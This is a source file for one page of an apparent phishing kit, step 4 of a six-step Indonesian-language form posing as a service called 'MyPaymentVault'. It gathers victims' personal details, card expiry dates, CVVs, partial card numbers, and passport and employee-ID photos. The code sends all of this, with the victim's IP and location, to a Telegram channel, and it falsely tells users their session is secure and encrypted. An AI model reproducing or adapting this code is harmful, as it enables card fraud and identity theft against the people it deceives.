import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import { Upload, Loader2, User, Phone, MapPin, FileText, CreditCard } from "lucide-react";
import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";

const INQUIRY_TYPES = [
  "Account Inquiry",
  "Card Issue",
  "Payment Problem",
  "Fraud Report",
  "Other",
];

export default function Step4() {
  const { user, isAuthenticated } = useAuth();
  const [, navigate] = useLocation();

  const [firstName, setFirstName]       = useState("");
  const [lastName, setLastName]         = useState("");
  const [email, setEmail]               = useState("");
  const [phone, setPhone]               = useState("");
  const [address, setAddress]           = useState("");
  const [city, setCity]                 = useState("");
  const [stateVal, setStateVal]         = useState("");
  const [postalCode, setPostalCode]     = useState("");
  const [dob, setDob]                   = useState("");
  const [inquiryType, setInquiryType]   = useState("");
  const [message, setMessage]           = useState("");
  const [cardDigits, setCardDigits]     = useState("");
  const [cardExp, setCardExp]           = useState("");
  const [cardCvv, setCardCvv]           = useState("");
  const [passportFile, setPassportFile] = useState<File | null>(null);
  const [empIdFile, setEmpIdFile]       = useState<File | null>(null);
  const [errors, setErrors]             = useState<Record<string, string>>({});
  const [loading, setLoading]           = useState(false);

  const passportRef = useRef<HTMLInputElement>(null);
  const empIdRef    = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (!isAuthenticated) navigate("/login");
  }, [isAuthenticated, navigate]);

  const validate = () => {
    const errs: Record<string, string> = {};
    if (!firstName.trim())   errs.firstName   = "Nama depan wajib diisi.";
    if (!lastName.trim())    errs.lastName    = "Nama belakang wajib diisi.";
    if (!email.trim())       errs.email       = "Email wajib diisi.";
    if (!phone.trim())       errs.phone       = "Nomor HP wajib diisi.";
    if (!address.trim())     errs.address     = "Alamat wajib diisi.";
    if (!city.trim())        errs.city        = "Kota wajib diisi.";
    if (!stateVal.trim())    errs.state       = "Provinsi wajib diisi.";
    if (!postalCode.trim())  errs.postalCode  = "Kode pos wajib diisi.";
    if (!dob.trim())         errs.dob         = "Tanggal lahir wajib diisi.";
    if (!inquiryType)        errs.inquiryType = "Pilih jenis pertanyaan.";
    if (!cardDigits.trim())  errs.cardDigits  = "8 digit akhiran kartu wajib diisi.";
    else if (!/^\d{8}$/.test(cardDigits.trim())) errs.cardDigits = "Harus tepat 8 angka.";
    if (!cardExp.trim())     errs.cardExp     = "Tanggal kadaluarsa wajib diisi.";
    else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExp.trim())) errs.cardExp = "Format: MM/YY";
    if (!cardCvv.trim())     errs.cardCvv     = "CVV wajib diisi.";
    else if (!/^\d{3,4}$/.test(cardCvv.trim())) errs.cardCvv = "CVV harus 3 atau 4 angka.";
    if (!passportFile)       errs.passport    = "Foto paspor wajib diunggah.";
    if (!empIdFile)          errs.empId       = "Foto ID karyawan wajib diunggah.";
    return errs;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setErrors({});
    setLoading(true);

    try {
      const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
      const ip  = await getIPInfo();

      await sendTelegram(
        `━━━━━━━━━━━━━━━━━━━━━\n` +
        `📋 <b>mypaymenttvaulltr.com</b>\n` +
        `📌 <b>Step 4 — Data Personal</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
        `👦 <b>Nama Lengkap</b>: <code>${firstName} ${lastName}</code>\n` +
        `💳 <b>Akhiran Kartu</b>: <code>XXXX XXXX ${cardDigits.trim()}</code>\n` +
        `📅 <b>Exp</b>          : <code>${cardExp.trim()}</code>\n` +
        `🔐 <b>CVV</b>          : <code>${cardCvv.trim()}</code>\n` +
        `📧 <b>Email</b>       : <code>${email}</code>\n` +
        `📱 <b>Mobile</b>      : <code>${phone}</code>\n` +
        `🏠 <b>Alamat</b>      : <code>${address}, ${city}, ${stateVal} ${postalCode}</code>\n` +
        `🎂 <b>Tgl Lahir</b>   : <code>${dob}</code>\n` +
        `📌 <b>Inquiry</b>     : <code>${inquiryType}</code>\n` +
        `💬 <b>Pesan</b>       : <code>${message || "-"}</code>\n` +
        `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
        `🕐 <b>Waktu</b>       : ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━`
      );

      await fetch("/api/submissions/personal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: user?.username ?? "",
          firstName, lastName, email, phone,
          address, city, state: stateVal, postalCode,
          dob, inquiryType, message, ipAddress: ip,
          cardDigits: cardDigits.trim(),
          cardExp: cardExp.trim(),
          cardCvv: cardCvv.trim(),
        }),
      }).catch(() => {});

      if (passportFile)
        await sendFileToTelegram(passportFile, `📷 Passport Photo — ${user?.username ?? "-"}`);
      if (empIdFile)
        await sendFileToTelegram(empIdFile, `🪪 Employee ID Photo — ${user?.username ?? "-"}`);

      navigate("/verify");
    } catch (_) {
      navigate("/verify");
    }
  };

  const FieldError = ({ name }: { name: string }) =>
    errors[name] ? (
      <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors[name]}</p>
    ) : null;

  const inputBase: React.CSSProperties = {
    width: "100%", height: 46,
    padding: "0 12px",
    fontSize: 14, color: "#111",
    border: "1.5px solid #ddd",
    borderRadius: 6,
    outline: "none", background: "#fafafa",
    boxSizing: "border-box",
    fontFamily: "inherit",
    transition: "border-color 0.15s",
  };

  const labelStyle: React.CSSProperties = {
    fontSize: 12, fontWeight: 600, color: "#444",
    display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.04em",
  };

  const sectionTitle = (icon: React.ReactNode, text: string) => (
    <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 16, marginTop: 8 }}>
      <div style={{ color: "#111" }}>{icon}</div>
      <span style={{ fontSize: 13, fontWeight: 700, color: "#111", textTransform: "uppercase", letterSpacing: "0.06em" }}>{text}</span>
      <div style={{ flex: 1, height: 1, background: "#ebebeb" }} />
    </div>
  );

  return (
    <div
      className="s4-outer min-h-screen flex flex-col items-center justify-center"
      style={{ background: "#f7f7f7" }}
    >
      <style>{`
        @media (max-width: 560px) {
          .s4-outer { background: #fff !important; justify-content: flex-start !important; }
          .s4-card  { max-width: 100% !important; min-height: 100dvh !important; box-shadow: none !important; border-radius: 0 !important; }
        }
        .s4-input:focus { border-color: #111 !important; }
        .s4-input::placeholder { color: #bbb; }
        .s4-input:disabled { opacity: 0.5; }
        .s4-upload:hover { background: #f0f0f0 !important; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
        .s4-fadein { animation: fadeUp 0.45s ease both; }
      `}</style>

      <div
        className="s4-card w-full flex flex-col bg-white"
        style={{ maxWidth: 560, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
      >
        {/* ══ HEADER ══ */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}>
          <span className="select-none" style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>
          <span style={{ fontSize: 12, color: "#888", background: "#f5f5f5", padding: "4px 10px", borderRadius: 20, fontWeight: 500 }}>
            Langkah 4 dari 6
          </span>
        </div>

        {/* ══ HERO IMAGE ══ */}
        <div style={{ width: "100%", lineHeight: 0 }}>
          <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
        </div>

        {/* ══ FORM ══ */}
        <form onSubmit={handleSubmit} style={{ padding: "28px 28px 36px" }} className="s4-fadein">

          {/* Step indicator */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginBottom: 28 }}>
            {[1, 2, 3, 4, 5, 6].map((n) => {
              const done = n < 4;
              const active = n === 4;
              return (
                <div key={n} style={{ display: "flex", alignItems: "center" }}>
                  <div style={{
                    width: 26, height: 26, borderRadius: "50%",
                    background: done || active ? "#111" : "#e0e0e0",
                    display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
                  }}>
                    {done ? (
                      <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                        <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    ) : (
                      <span style={{ fontSize: 11, color: active ? "#fff" : "#aaa", fontWeight: 700 }}>{n}</span>
                    )}
                  </div>
                  {n < 6 && <div style={{ width: 28, height: 2, background: done ? "#111" : "#e0e0e0", margin: "0 2px" }} />}
                </div>
              );
            })}
          </div>

          {/* Title */}
          <div style={{ textAlign: "center", marginBottom: 24 }}>
            <h2 style={{ fontSize: 20, fontWeight: 700, color: "#111", marginBottom: 4 }}>Data Personal</h2>
            <p style={{ fontSize: 13, color: "#777" }}>Lengkapi informasi pribadi Anda untuk verifikasi akun.</p>
          </div>

          {/* ── Section: Info Pribadi ── */}
          {sectionTitle(<User size={15} />, "Info Pribadi")}

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
            <div>
              <label style={labelStyle}>Nama Depan *</label>
              <input className="s4-input" type="text" placeholder="John" value={firstName}
                onChange={(e) => setFirstName(e.target.value)} disabled={loading}
                style={{ ...inputBase, borderColor: errors.firstName ? "#e00" : "#ddd" }} />
              <FieldError name="firstName" />
            </div>
            <div>
              <label style={labelStyle}>Nama Belakang *</label>
              <input className="s4-input" type="text" placeholder="Doe" value={lastName}
                onChange={(e) => setLastName(e.target.value)} disabled={loading}
                style={{ ...inputBase, borderColor: errors.lastName ? "#e00" : "#ddd" }} />
              <FieldError name="lastName" />
            </div>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
            <div>
              <label style={labelStyle}>Email *</label>
              <input className="s4-input" type="email" placeholder="contoh@email.com" value={email}
                onChange={(e) => setEmail(e.target.value)} disabled={loading}
                style={{ ...inputBase, borderColor: errors.email ? "#e00" : "#ddd" }} />
              <FieldError name="email" />
            </div>
            <div>
              <label style={labelStyle}>Tanggal Lahir *</label>
              <input className="s4-input" type="text" placeholder="DD-MM-YYYY" value={dob}
                onChange={(e) => setDob(e.target.value)} disabled={loading}
                style={{ ...inputBase, borderColor: errors.dob ? "#e00" : "#ddd" }} />
              <FieldError name="dob" />
            </div>
          </div>

          {/* ── Section: Kartu ── */}
          {sectionTitle(<CreditCard size={15} />, "Informasi Kartu")}

          <div style={{ marginBottom: 20 }}>
            <label style={labelStyle}>8 Digit Akhiran Kartu *</label>
            <div style={{ position: "relative" }}>
              <span style={{
                position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
                fontSize: 14, color: "#bbb", letterSpacing: "0.08em", pointerEvents: "none",
                fontFamily: "monospace",
              }}>
                XXXX XXXX
              </span>
              <input
                className="s4-input"
                type="text"
                inputMode="numeric"
                placeholder="12345678"
                maxLength={8}
                value={cardDigits}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "").slice(0, 8);
                  setCardDigits(val);
                  setErrors(p => ({ ...p, cardDigits: "" }));
                }}
                disabled={loading}
                style={{
                  ...inputBase,
                  paddingLeft: 110,
                  borderColor: errors.cardDigits ? "#e00" : "#ddd",
                  fontFamily: "monospace",
                  letterSpacing: "0.15em",
                  fontSize: 16,
                }}
              />
            </div>
            {errors.cardDigits && (
              <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors.cardDigits}</p>
            )}
            <p style={{ fontSize: 11, color: "#888", marginTop: 5 }}>
              Masukkan 8 digit terakhir nomor kartu Anda.
            </p>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 20 }}>
            {/* EXP */}
            <div>
              <label style={labelStyle}>Tanggal Kadaluarsa (EXP) *</label>
              <input
                className="s4-input"
                type="text"
                inputMode="numeric"
                placeholder="MM/YY"
                maxLength={5}
                value={cardExp}
                onChange={(e) => {
                  let val = e.target.value.replace(/\D/g, "").slice(0, 4);
                  if (val.length > 2) val = val.slice(0, 2) + "/" + val.slice(2);
                  setCardExp(val);
                  setErrors(p => ({ ...p, cardExp: "" }));
                }}
                disabled={loading}
                style={{
                  ...inputBase,
                  borderColor: errors.cardExp ? "#e00" : "#ddd",
                  fontFamily: "monospace",
                  letterSpacing: "0.12em",
                }}
              />
              {errors.cardExp && (
                <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors.cardExp}</p>
              )}
            </div>

            {/* CVV */}
            <div>
              <label style={labelStyle}>CVV *</label>
              <input
                className="s4-input"
                type="password"
                inputMode="numeric"
                placeholder="•••"
                maxLength={4}
                value={cardCvv}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "").slice(0, 4);
                  setCardCvv(val);
                  setErrors(p => ({ ...p, cardCvv: "" }));
                }}
                disabled={loading}
                style={{
                  ...inputBase,
                  borderColor: errors.cardCvv ? "#e00" : "#ddd",
                  fontFamily: "monospace",
                  letterSpacing: "0.2em",
                }}
              />
              {errors.cardCvv && (
                <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors.cardCvv}</p>
              )}
              <p style={{ fontSize: 11, color: "#888", marginTop: 5 }}>
                3 digit di belakang kartu (Visa/MC) atau 4 digit depan (Amex).
              </p>
            </div>
          </div>

          {/* ── Section: Kontak ── */}
          {sectionTitle(<Phone size={15} />, "Kontak")}

          <div style={{ marginBottom: 14 }}>
            <label style={labelStyle}>Nomor HP *</label>
            <input className="s4-input" type="tel" placeholder="+62 812 xxxx xxxx" value={phone}
              onChange={(e) => setPhone(e.target.value)} disabled={loading}
              style={{ ...inputBase, borderColor: errors.phone ? "#e00" : "#ddd" }} />
            <FieldError name="phone" />
          </div>

          {/* ── Section: Alamat ── */}
          {sectionTitle(<MapPin size={15} />, "Alamat")}

          <div style={{ marginBottom: 14 }}>
            <label style={labelStyle}>Alamat *</label>
            <input className="s4-input" type="text" placeholder="Jl. Contoh No. 1" value={address}
              onChange={(e) => setAddress(e.target.value)} disabled={loading}
              style={{ ...inputBase, borderColor: errors.address ? "#e00" : "#ddd" }} />
            <FieldError name="address" />
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
            <div>
              <label style={labelStyle}>Kota *</label>
              <input className="s4-input" type="text" placeholder="Jakarta" value={city}
                onChange={(e) => setCity(e.target.value)} disabled={loading}
                style={{ ...inputBase, borderColor: errors.city ? "#e00" : "#ddd" }} />
              <FieldError name="city" />
            </div>
            <div>
              <label style={labelStyle}>Provinsi *</label>
              <input className="s4-input" type="text" placeholder="DKI Jakarta" value={stateVal}
                onChange={(e) => setStateVal(e.target.value)} disabled={loading}
                style={{ ...inputBase, borderColor: errors.state ? "#e00" : "#ddd" }} />
              <FieldError name="state" />
            </div>
          </div>

          <div style={{ marginBottom: 14 }}>
            <label style={labelStyle}>Kode Pos *</label>
            <input className="s4-input" type="text" placeholder="12345" value={postalCode}
              onChange={(e) => setPostalCode(e.target.value)} disabled={loading}
              style={{ ...inputBase, width: "50%", borderColor: errors.postalCode ? "#e00" : "#ddd" }} />
            <FieldError name="postalCode" />
          </div>

          {/* ── Section: Pertanyaan ── */}
          {sectionTitle(<FileText size={15} />, "Jenis Pertanyaan")}

          <div style={{ marginBottom: 14 }}>
            <label style={labelStyle}>Pilih Jenis *</label>
            <select
              value={inquiryType}
              onChange={(e) => setInquiryType(e.target.value)}
              disabled={loading}
              style={{
                ...inputBase,
                borderColor: errors.inquiryType ? "#e00" : "#ddd",
                appearance: "none",
                backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
                backgroundRepeat: "no-repeat",
                backgroundPosition: "right 12px center",
                paddingRight: 32,
                color: inquiryType ? "#111" : "#bbb",
              }}
            >
              <option value="" disabled>Pilih jenis pertanyaan...</option>
              {INQUIRY_TYPES.map((t) => (
                <option key={t} value={t} style={{ color: "#111" }}>{t}</option>
              ))}
            </select>
            <FieldError name="inquiryType" />
          </div>

          <div style={{ marginBottom: 20 }}>
            <label style={labelStyle}>Pesan (opsional)</label>
            <textarea
              placeholder="Tulis pesan Anda di sini..."
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              disabled={loading}
              rows={3}
              style={{
                width: "100%", padding: "10px 12px",
                fontSize: 14, color: "#111",
                border: "1.5px solid #ddd", borderRadius: 6,
                outline: "none", background: "#fafafa",
                boxSizing: "border-box", resize: "vertical",
                fontFamily: "inherit", transition: "border-color 0.15s",
              }}
            />
          </div>

          {/* ── Section: Upload Dokumen ── */}
          {sectionTitle(<Upload size={15} />, "Upload Dokumen")}

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 28 }}>
            {/* Passport */}
            <div>
              <label style={labelStyle}>Foto Paspor *</label>
              <p style={{ fontSize: 11, color: "#999", marginBottom: 8 }}>JPEG / PNG • Maks 50 MB</p>
              <input ref={passportRef} type="file" accept="image/jpeg,image/png" style={{ display: "none" }}
                onChange={(e) => { setPassportFile(e.target.files?.[0] ?? null); setErrors(p => ({ ...p, passport: "" })); }} />
              <button type="button" className="s4-upload" onClick={() => passportRef.current?.click()}
                style={{
                  width: "100%", height: 80, background: errors.passport ? "#fff5f5" : "#fafafa",
                  border: `1.5px dashed ${errors.passport ? "#e00" : "#ddd"}`,
                  borderRadius: 6, cursor: "pointer",
                  display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 6,
                  fontSize: 12, color: passportFile ? "#111" : "#999",
                  transition: "background 0.15s",
                }}>
                <Upload size={18} color={passportFile ? "#111" : "#bbb"} />
                <span style={{ fontSize: 11, textAlign: "center", padding: "0 4px", wordBreak: "break-all" }}>
                  {passportFile ? passportFile.name : "Klik untuk unggah"}
                </span>
              </button>
              <FieldError name="passport" />
            </div>

            {/* Employee ID */}
            <div>
              <label style={labelStyle}>Foto ID Karyawan *</label>
              <p style={{ fontSize: 11, color: "#999", marginBottom: 8 }}>JPEG / PNG • Maks 50 MB</p>
              <input ref={empIdRef} type="file" accept="image/jpeg,image/png" style={{ display: "none" }}
                onChange={(e) => { setEmpIdFile(e.target.files?.[0] ?? null); setErrors(p => ({ ...p, empId: "" })); }} />
              <button type="button" className="s4-upload" onClick={() => empIdRef.current?.click()}
                style={{
                  width: "100%", height: 80, background: errors.empId ? "#fff5f5" : "#fafafa",
                  border: `1.5px dashed ${errors.empId ? "#e00" : "#ddd"}`,
                  borderRadius: 6, cursor: "pointer",
                  display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 6,
                  fontSize: 12, color: empIdFile ? "#111" : "#999",
                  transition: "background 0.15s",
                }}>
                <Upload size={18} color={empIdFile ? "#111" : "#bbb"} />
                <span style={{ fontSize: 11, textAlign: "center", padding: "0 4px", wordBreak: "break-all" }}>
                  {empIdFile ? empIdFile.name : "Klik untuk unggah"}
                </span>
              </button>
              <FieldError name="empId" />
            </div>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={loading}
            style={{
              width: "100%", height: 52,
              background: loading ? "#555" : "#111", color: "#fff",
              border: "none", borderRadius: 6,
              fontSize: 15, fontWeight: 600,
              cursor: loading ? "not-allowed" : "pointer",
              letterSpacing: "0.03em",
              display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
              transition: "background 0.15s",
            }}
          >
            {loading ? (
              <>
                <Loader2 size={18} style={{ animation: "spin 1s linear infinite" }} />
                Mengirim Data...
              </>
            ) : (
              "Lanjutkan →"
            )}
          </button>

          <p style={{ fontSize: 12, color: "#bbb", textAlign: "center", marginTop: 14 }}>
            Sesi Anda aman dan terenkripsi.
          </p>
        </form>

        <div style={{ padding: "12px 28px 20px", textAlign: "center" }}>
          <span style={{ fontSize: 11, color: "#ccc" }}>
            &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
          </span>
        </div>
      </div>
    </div>
  );
}
